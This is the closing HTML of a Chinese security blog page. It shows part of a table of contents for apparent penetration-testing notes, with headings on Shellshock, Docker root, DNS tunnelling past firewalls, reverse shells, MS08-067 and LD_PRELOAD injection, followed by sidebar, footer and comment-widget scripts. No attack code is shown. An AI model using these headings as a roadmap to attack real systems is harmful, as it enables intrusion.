href="#SSH-Over-SCTP-%E4%BD%BF%E7%94%A8-Socat"><span class="toc-number">65.</span> <span class="toc-text">SSH Over SCTP (使用 Socat)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Metagoofil-%E2%80%93-%E5%85%83%E6%95%B0%E6%8D%AE%E6%94%B6%E9%9B%86%E5%B7%A5%E5%85%B7"><span class="toc-number">66.</span> <span class="toc-text">Metagoofil – 元数据收集工具</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8-Shellshock"><span class="toc-number">67.</span> <span class="toc-text">利用 Shellshock</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96-Docker-%E7%9A%84-Root"><span class="toc-number">68.</span> <span class="toc-text">获取 Docker 的 Root</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8-DNS-%E9%9A%A7%E9%81%93%E7%BB%95%E8%BF%87%E9%98%B2%E7%81%AB%E5%A2%99"><span class="toc-number">69.</span> <span class="toc-text">使用 DNS 隧道绕过防火墙</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BC%96%E8%AF%91-Assemble-%E4%BB%A3%E7%A0%81"><span class="toc-number">70.</span> <span class="toc-text">编译 Assemble 代码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8%E9%9D%9E%E4%BA%A4%E4%BA%92-Shell-%E6%89%93%E5%85%A5%E5%86%85%E7%BD%91"><span class="toc-number">71.</span> <span class="toc-text">使用非交互 Shell 打入内网</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8-POST-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E8%8E%B7%E5%8F%96-Shell"><span class="toc-number">72.</span> <span class="toc-text">利用 POST 远程命令执行获取 Shell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%A5%E7%AE%A1%E7%90%86%E5%91%98%E8%BA%AB%E4%BB%BD%E5%9C%A8-Win7-%E4%B8%8A%E5%8F%8D%E5%BC%B9%E5%85%B7%E6%9C%89%E7%B3%BB%E7%BB%9F%E6%9D%83%E9%99%90%E7%9A%84-Shell"><span class="toc-number">73.</span> <span class="toc-text">以管理员身份在 Win7 上反弹具有系统权限的 Shell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%A5%E6%99%AE%E9%80%9A%E7%94%A8%E6%88%B7%E8%BA%AB%E4%BB%BD%E5%9C%A8-Win7-%E4%B8%8A%E5%8F%8D%E5%BC%B9%E5%85%B7%E6%9C%89%E7%B3%BB%E7%BB%9F%E6%9D%83%E9%99%90%E7%9A%84-Shell"><span class="toc-number">74.</span> <span class="toc-text">以普通用户身份在 Win7 上反弹具有系统权限的 Shell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#MS08-067-%E2%80%93-%E4%B8%8D%E4%BD%BF%E7%94%A8-Metasploit"><span class="toc-number">75.</span> <span class="toc-text">MS08-067 – 不使用 Metasploit</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%80%9A%E8%BF%87-MySQL-Root-%E8%B4%A6%E6%88%B7%E5%AE%9E%E7%8E%B0%E6%8F%90%E6%9D%83"><span class="toc-number">76.</span> <span class="toc-text">通过 MySQL Root 账户实现提权</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8-LD-PRELOAD-%E6%B3%A8%E5%85%A5%E7%A8%8B%E5%BA%8F"><span class="toc-number">77.</span> <span class="toc-text">使用 LD_PRELOAD 注入程序</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%92%88%E5%AF%B9-OpenSSH-%E7%94%A8%E6%88%B7%E8%BF%9B%E8%A1%8C%E6%9E%9A%E4%B8%BE%E6%97%B6%E5%BA%8F%E6%94%BB%E5%87%BB"><span class="toc-number">78.</span> <span class="toc-text">针对 OpenSSH 用户进行枚举时序攻击</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8-ReDuh-%E6%9E%84%E9%80%A0%E5%90%88%E6%B3%95%E7%9A%84-HTTP-%E8%AF%B7%E6%B1%82%E4%BB%A5%E5%BB%BA%E7%AB%8B-TCP-%E9%80%9A%E9%81%93"><span class="toc-number">79.</span> <span class="toc-text">使用 ReDuh 构造合法的 HTTP 请求以建立 TCP 通道</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Post</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2022/06/08/%E5%A6%82%E4%BD%95%E9%80%89%E5%9F%BA%E9%87%91-%E8%B5%84%E4%BA%A7%E9%85%8D%E7%BD%AE%E7%AC%94%E8%AE%B0/" title="如何选基金-资产配置笔记"><img src="https://i.pinimg.com/236x/b9/07/30/b90730587441cae34918bc6f4a2e3d6a.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="如何选基金-资产配置笔记"/></a><div class="content"><a class="title" href="/2022/06/08/%E5%A6%82%E4%BD%95%E9%80%89%E5%9F%BA%E9%87%91-%E8%B5%84%E4%BA%A7%E9%85%8D%E7%BD%AE%E7%AC%94%E8%AE%B0/" title="如何选基金-资产配置笔记">如何选基金-资产配置笔记</a><time datetime="2022-06-08T06:42:34.000Z" title="Created 2022-06-08 14:42:34">2022-06-08</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/06/01/%E5%8F%96%E8%AF%81%E5%88%86%E6%9E%90%E6%B5%81%E7%A8%8B/" title="取证分析流程"><img src="https://cdn.pixabay.com/photo/2020/02/22/17/53/communication-4871245__340.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="取证分析流程"/></a><div class="content"><a class="title" href="/2022/06/01/%E5%8F%96%E8%AF%81%E5%88%86%E6%9E%90%E6%B5%81%E7%A8%8B/" title="取证分析流程">取证分析流程</a><time datetime="2022-06-01T07:36:18.000Z" title="Created 2022-06-01 15:36:18">2022-06-01</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/05/09/Android%E5%8A%A0%E5%A3%B3%E4%B8%8E%E8%84%B1%E5%A3%B3%EF%BC%88%E4%BA%8C%EF%BC%89%EF%BC%9A%E5%8A%A0%E5%A3%B3%E4%B8%8E%E8%84%B1%E5%A3%B3/" title="Android加壳与脱壳（二）：加壳与脱壳"><img src="https://cdn.pixabay.com/photo/2012/10/29/15/36/ball-63527__340.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Android加壳与脱壳（二）：加壳与脱壳"/></a><div class="content"><a class="title" href="/2022/05/09/Android%E5%8A%A0%E5%A3%B3%E4%B8%8E%E8%84%B1%E5%A3%B3%EF%BC%88%E4%BA%8C%EF%BC%89%EF%BC%9A%E5%8A%A0%E5%A3%B3%E4%B8%8E%E8%84%B1%E5%A3%B3/" title="Android加壳与脱壳（二）：加壳与脱壳">Android加壳与脱壳（二）：加壳与脱壳</a><time datetime="2022-05-09T06:24:16.000Z" title="Created 2022-05-09 14:24:16">2022-05-09</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/05/06/Android%20Inline%20Hook%20%E5%88%9D%E8%AF%86/" title="Android Inline Hook 初识"><img src="https://i.pinimg.com/236x/0d/ad/60/0dad605a2bf13f596f477036142ebfb3.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Android Inline Hook 初识"/></a><div class="content"><a class="title" href="/2022/05/06/Android%20Inline%20Hook%20%E5%88%9D%E8%AF%86/" title="Android Inline Hook 初识">Android Inline Hook 初识</a><time datetime="2022-05-06T12:18:29.000Z" title="Created 2022-05-06 20:18:29">2022-05-06</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/05/06/Android%E5%8A%A0%E5%A3%B3%E4%B8%8E%E8%84%B1%E5%A3%B3%EF%BC%88%E4%B8%80%EF%BC%89%EF%BC%9A%E7%B1%BB%E5%8A%A0%E8%BD%BD%E5%99%A8%E4%B8%8E%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E7%9A%84%E5%85%B3%E7%B3%BB%E4%B8%8E%E5%8E%9F%E7%90%86/" title="Android加壳与脱壳（一）：类加载器与动态加载的关系与原理"><img src="https://cdn.pixabay.com/photo/2016/03/27/18/54/technology-1283624__340.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Android加壳与脱壳（一）：类加载器与动态加载的关系与原理"/></a><div class="content"><a class="title" href="/2022/05/06/Android%E5%8A%A0%E5%A3%B3%E4%B8%8E%E8%84%B1%E5%A3%B3%EF%BC%88%E4%B8%80%EF%BC%89%EF%BC%9A%E7%B1%BB%E5%8A%A0%E8%BD%BD%E5%99%A8%E4%B8%8E%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E7%9A%84%E5%85%B3%E7%B3%BB%E4%B8%8E%E5%8E%9F%E7%90%86/" title="Android加壳与脱壳（一）：类加载器与动态加载的关系与原理">Android加壳与脱壳（一）：类加载器与动态加载的关系与原理</a><time datetime="2022-05-06T06:54:43.000Z" title="Created 2022-05-06 14:54:43">2022-05-06</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2022 By bosch</div><div class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Read Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Switch Between Light And Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle between single-column and double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="Setting"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table Of Contents"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="Scroll To Comments"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="Back To Top"><i class="fas fa-arrow-up"></i></button></div></div><div id="algolia-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">Algolia</span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="search-wrap"><div id="algolia-search-input"></div><hr/><div id="algolia-search-results"><div id="algolia-hits"></div><div id="algolia-pagination"></div><div id="algolia-stats"></div></div></div></div><div id="search-mask"></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.js"></script><script src="https://cdn.jsdelivr.net/npm/algoliasearch@4/dist/algoliasearch-lite.umd.js"></script><script src="https://cdn.jsdelivr.net/npm/instantsearch.js@4/dist/instantsearch.production.min.js"></script><script src="/js/search/algolia.js"></script><div class="js-pjax"><script>function loadValine () {
  function initValine () {
    const valine = new Valine(Object.assign({
      el: '#vcomment',
      appId: 'A1yHizbt6njivw1xL89dRlHw-gzGzoHsz',
      appKey: 'dUsAYDyF0DqEAvpSTG3sioz6',
      avatar: 'monsterid',
      serverURLs: '',
      emojiMaps: "",
      path: window.location.pathname,
      visitor: false
    }, null))
  }

  if (typeof Valine === 'function') initValine() 
  else getScript('https://cdn.jsdelivr.net/npm/valine/dist/Valine.min.js').then(initValine)
}

if ('Valine' === 'Valine' || !false) {
  if (false) btf.loadComment(document.getElementById('vcomment'),loadValine)
  else setTimeout(loadValine, 0)
} else {
  function loadOtherComment () {
    loadValine()
  }
}</script><script>function addGitalkSource () {
  const ele = document.createElement('link')
  ele.rel = 'stylesheet'
  ele.href= 'https://cdn.jsdelivr.net/npm/gitalk/dist/gitalk.min.css'
  document.getElementsByTagName('head')[0].appendChild(ele)
}

function loadGitalk () {
  function initGitalk () {
    var gitalk = new Gitalk(Object.assign({
      clientID: '',
      clientSecret: '',
      repo: '',
      owner: '',
      admin: [''],
      id: 'af72a3a5fa3349a20704fee1ec17dd78',
      updateCountCallback: commentCount
    },null))

    gitalk.render('gitalk-container')
  }

  if (typeof Gitalk === 'function') initGitalk()
  else {
    addGitalkSource()
    getScript('https://cdn.jsdelivr.net/npm/gitalk@latest/dist/gitalk.min.js').then(initGitalk)
  }
}

function commentCount(n){
  let isCommentCount = document.querySelector('#post-meta .gitalk-comment-count')
  if (isCommentCount) {
    isCommentCount.innerHTML= n
  }
}

if ('Valine' === 'Gitalk' || !false) {
  if (false) btf.loadComment(document.getElementById('gitalk-container'), loadGitalk)
  else loadGitalk()
} else {
  function loadOtherComment () {
    loadGitalk()
  }
}</script></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div><!-- hexo injector body_end start --><script data-pjax src="https://npm.elemecdn.com/hexo-filter-gitcalendar/lib/gitcalendar.js"></script><script data-pjax>
  function gitcalendar_injector_config(){
      var parent_div_git = document.getElementById('recent-posts');
      var item_html = '<div class="recent-post-item" style="width:100%;height:auto;padding:10px;"><style>#git_container{min-height: 280px}@media screen and (max-width:650px) {#git_container{min-height: 0px}}</style><div id="git_loading" style="width:10%;height:100%;margin:0 auto;display: block;"><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 50 50" style="enable-background:new 0 0 50 50" xml:space="preserve"><path fill="#d0d0d0" d="M25.251,6.461c-10.318,0-18.683,8.365-18.683,18.683h4.068c0-8.071,6.543-14.615,14.615-14.615V6.461z" transform="rotate(275.098 25 25)"><animatetransform attributeType="xml" attributeName="transform" type="rotate" from="0 25 25" to="360 25 25" dur="0.6s" repeatCount="indefinite"></animatetransform></path></svg><style>#git_container{display: none;}</style></div><div id="git_container"></div></div>';
      parent_div_git.insertAdjacentHTML("afterbegin",item_html)
      console.log('已挂载gitcalendar')
      }

    if( document.getElementById('recent-posts') && (location.pathname ==='/'|| '/' ==='all')){
        gitcalendar_injector_config()
        GitCalendarInit("ckcah-github-io-1.vercel.app/api?ckcah",['#ebedf0', '#f1f8ff', '#dbedff', '#c8e1ff', '#79b8ff', '#2188ff', '#0366d6', '#005cc5', '#044289', '#032f62', '#05264c'],'ckcah')
    }
  </script><!-- hexo injector body_end end --></body></html>